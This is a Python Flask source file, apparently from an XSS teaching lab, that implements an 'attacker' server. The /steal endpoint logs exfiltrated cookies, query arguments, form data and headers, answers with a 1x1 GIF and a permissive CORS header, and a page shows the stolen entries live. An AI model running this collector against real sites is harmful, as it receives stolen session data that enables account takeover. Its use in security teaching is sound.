"""
Server "attaccante" - per scopi didattici.

Riceve dati esfiltrati (cookie, contenuto pagina, etc.) tramite GET /steal
e li mostra in un log live consultabile su /.

Lo scopo e dimostrare l'IMPATTO concreto di un XSS:
i payload iniettati nella vittima inviano qui i dati sensibili.
"""
from __future__ import annotations

import json
import os
from datetime import datetime, timezone
from pathlib import Path
from threading import Lock

from flask import Flask, jsonify, render_template, request

app = Flask(__name__)

LOG_PATH = Path(os.environ.get("LOG_PATH", "/app/data/stolen.log"))
LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
_lock = Lock()


def _append(entry: dict) -> None:
    with _lock:
        with LOG_PATH.open("a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")


def _read_all() -> list[dict]:
    if not LOG_PATH.exists():
        return []
    with _lock, LOG_PATH.open("r", encoding="utf-8") as f:
        return [json.loads(line) for line in f if line.strip()]


@app.route("/steal", methods=["GET", "POST", "OPTIONS"])
def steal():
    payload = {
        "ts": datetime.now(timezone.utc).isoformat(),
        "ip": request.remote_addr,
        "method": request.method,
        "ua": request.headers.get("User-Agent", ""),
        "referer": request.headers.get("Referer", ""),
        "args": dict(request.args),
        "form": dict(request.form),
    }
    _append(payload)
    # Risposta minimale (immagine 1x1) per non interrompere la pagina vittima.
    response = app.response_class(
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00,"
        b"\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;",
        mimetype="image/gif",
    )
    response.headers["Access-Control-Allow-Origin"] = "*"
    return response


@app.route("/")
def index():
    return render_template("log.html", entries=list(reversed(_read_all())))


@app.route("/api/log")
def api_log():
    return jsonify(_read_all())


@app.route("/reset", methods=["POST"])
def reset():
    with _lock:
        if LOG_PATH.exists():
            LOG_PATH.unlink()
    return ("", 204)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=6000, debug=False)
